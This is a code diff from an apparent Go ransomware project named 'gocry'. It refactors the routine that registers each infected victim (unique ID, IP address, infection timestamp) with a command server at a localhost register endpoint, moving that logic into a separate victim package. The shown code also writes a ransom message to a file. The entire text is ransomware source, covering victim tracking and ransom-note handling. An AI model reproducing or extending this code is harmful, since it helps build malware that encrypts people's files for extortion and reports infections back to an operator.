@@ -9,7 +9,6 @@ import (
 	"crypto/rsa"
 	"crypto/sha256"
 	"crypto/x509"
-	"encoding/json"
 	"encoding/pem"
 	"errors"
 	"io"
@@ -21,6 +20,7 @@ import (
 	"time"
 
 	"github.com/nireo/gocry/utils"
+	"github.com/nireo/gocry/victim"
 	uuid "github.com/satori/go.uuid"
 	"golang.org/x/exp/errors/fmt"
 )
@@ -41,12 +41,6 @@ type Ransomware struct {
 	publicKey string
 	rootDir   string
 	publicIP  string
-}
-
-type victimIndentifier struct {
-	UUID      string `json:"uuid"` // A unique id used to identify the victim
-	IP        string `json:"ip"`
-	Timestamp int64  `json:"timestamp"` // A timestamp of the infection
 }
 
 // GenNewKey creates a random 32-bit key using the std crypto library.
@@ -259,24 +253,9 @@ func main() {
 		log.Fatalf("error creating an unique indentifier: %s", err)
 	}
 
-	reqBody, err := json.Marshal(&victimIndentifier{
-		Timestamp: time.Now().Unix(),
-		IP:        "127.0.0.1",
-		UUID:      uindef.String(),
-	})
-
-	if err != nil {
-		log.Fatalf("error marshaling victim data: %s", err)
-	}
-
-	resp, err = http.Post("http://localhost:8080/register", "application/json", bytes.NewBuffer(reqBody))
-	if err != nil {
-		log.Fatalf("error sending victim register request: %s", err)
-	}
-
-	if resp.StatusCode != 200 {
-		log.Fatal("wrong response status code, stopping...")
-	}
+	victimIndentifier := victim.NewVictimIndentifer()
+	victimIndentifier.IP = "127.0.0.1"
+	victimIndentifier.SendToServer("http://localhost:8080/register")
 
 	if _, err := file.WriteString(message); err != nil {
 		log.Fatal(err)
